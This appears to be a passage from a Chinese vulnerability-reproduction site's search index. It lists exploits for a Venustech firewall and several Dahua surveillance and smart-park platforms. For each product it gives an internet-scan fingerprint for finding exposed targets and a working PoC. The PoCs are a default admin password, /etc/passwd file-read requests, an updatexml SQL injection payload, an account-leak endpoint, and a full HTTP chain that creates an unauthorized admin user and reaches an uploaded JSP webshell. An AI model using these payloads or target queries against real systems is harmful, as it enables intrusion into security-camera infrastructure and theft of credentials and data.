","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 启明星辰 天清汉⻢USG防⽕墙 存在默认口令漏洞，攻击者通过账号密码可以进入后台 ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 启明星辰 天清汉马USG防火墙 ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"天清汉马USG防火墙\" ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 默认口令 账号：useradmin 密码：venus.user 成功登录 ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"大华 ICC智能物联综合管理平台 readPic 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-icc%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-readpic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-icc%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-readpic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 大化 ICC智能物联综合管理平台 readPic 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-icc%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-readpic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-icc%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-readpic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 大华 ICC智能物联综合管理平台 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-icc%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-readpic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-icc%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-readpic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"*客户端会小于800*\" ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-icc%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-readpic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-icc%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-readpic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 poc /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-icc%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-readpic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-icc%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-readpic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"大华 城市安防监控系统平台管理 attachment_downloadByUrlAtt.action 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%AE%A1%E7%90%86-attachment_downloadbyurlatt.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%AE%A1%E7%90%86-attachment_downloadbyurlatt.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 大华城市安防监控系统平台管理存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%AE%A1%E7%90%86-attachment_downloadbyurlatt.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%AE%A1%E7%90%86-attachment_downloadbyurlatt.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 大华城市安防监控系统平台管理 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%AE%A1%E7%90%86-attachment_downloadbyurlatt.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%AE%A1%E7%90%86-attachment_downloadbyurlatt.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"attachment_downloadByUrlAtt.action\" ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%AE%A1%E7%90%86-attachment_downloadbyurlatt.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%AE%A1%E7%90%86-attachment_downloadbyurlatt.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%AE%A1%E7%90%86-attachment_downloadbyurlatt.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%AE%A1%E7%90%86-attachment_downloadbyurlatt.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"大华 智慧园区综合管理平台 getFaceCapture SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getfacecapture-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getfacecapture-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 大华 智慧园区综合管理平台 getFaceCapture 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意SQL语句，获取数据库敏感信息 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getfacecapture-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getfacecapture-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 智慧园区综合管理平台 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getfacecapture-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getfacecapture-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"dahua-智慧园区综合管理平台\" ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getfacecapture-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getfacecapture-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 请求POC /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1)--%22%7D/extend/%7B%7D ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getfacecapture-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getfacecapture-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"大华 智慧园区综合管理平台 user_getUserInfoByUserName.action 账号密码泄漏漏洞 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_getuserinfobyusername.action-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_getuserinfobyusername.action-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 大华 智慧园区综合管理平台 user_getUserInfoByUserName.action 中存在API接口，导致管理园账号密码泄漏 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_getuserinfobyusername.action-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_getuserinfobyusername.action-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 智慧园区综合管理平台 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_getuserinfobyusername.action-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_getuserinfobyusername.action-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"dahua-智慧园区综合管理平台\" ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_getuserinfobyusername.action-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_getuserinfobyusername.action-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 请求POC /admin/user_getUserInfoByUserName.action?userName=system 获取后访问地址 /admin/login_login.action ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_getuserinfobyusername.action-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_getuserinfobyusername.action-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"大华 智慧园区综合管理平台 user_save.action 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_save.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_save.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 大华 智慧园区综合管理平台存在未授权访问漏洞，攻击者通过构造特殊的请求包可以创建新用户，再利用文件上传漏洞获取服务器权限 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_save.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_save.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 大华 智慧园区综合管理平台 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_save.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_save.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"dahua-智慧园区综合管理平台\" ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_save.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_save.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 验证POC POST /admin/user_save.action HTTP/1.1 Host: Accept-Encoding: gzip Content-Length: 914 Content-Type: multipart/form-data; boundary=----fxwrpqcy Cookie: JSESSIONID=65A8F19555DC1EFB09B5A8B4F0F6921C User-Agent: Go-http-client/1.1 ------fxwrpqcy Content-Disposition: form-data; name=\"userBean.userType\" 0 ------fxwrpqcy Content-Disposition: form-data; name=\"userBean.ownerCode\" 001 ------fxwrpqcy Content-Disposition: form-data; name=\"userBean.isReuse\" 0 ------fxwrpqcy Content-Disposition: form-data; name=\"userBean.macStat\" 0 ------fxwrpqcy Content-Disposition: form-data; name=\"userBean.roleIds\" 1 ------fxwrpqcy Content-Disposition: form-data; name=\"userBean.loginName\" luqaahkf ------fxwrpqcy Content-Disposition: form-data; name=\"displayedOrgName\" luqaahkf ------fxwrpqcy Content-Disposition: form-data; name=\"userBean.loginPass\" lhndpuxl ------fxwrpqcy Content-Disposition: form-data; name=\"checkPass\" lhndpuxl ------fxwrpqcy Content-Disposition: form-data; name=\"userBean.groupId\" 0 ------fxwrpqcy Content-Disposition: form-data; name=\"userBean.userName\" luqaahkf ------fxwrpqcy-- POST /WPMS/getPublicKey HTTP/1.1 Host: Accept-Encoding: gzip Content-Length: 25 Content-Type: application/json User-Agent: Go-http-client/1.1 {\"loginName\":\"luqaahkf\"} POST /WPMS/login HTTP/1.1 Host: Accept-Encoding: gzip Content-Length: 271 Content-Type: application/json User-Agent: Go-http-client/1.1 {\"loginName\":\"luqaahkf\",\"loginPass\":\"IxID6I8gKNSkCgu5UMwfRAhZpyvKKzu9q+dUngiieHiCTA52x3/uNB17NmAOletbzTOT46fLE5AOOMqMaqdDLA5rcsB3/Gql1qYwbNWLB6orKWpWEr9asUeNi/3ccIb95NUAXS1yn0l3ks94jbGT/CYbNq+JiBAeYlwcfdrqYkM=\",\"timestamp\":\"16853622671401904168273612873678126378126387\"} /admin/login_login.action?subSystemToken=87a629bc14298c1533d8b52dd63e87f7 /upload/axqvssmz.jsp ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_save.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_save.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"大华 智慧园区综合管理平台 video 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-video-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-video-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 大华 智慧园区综合管理平台 video 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器中，控制服务器权限 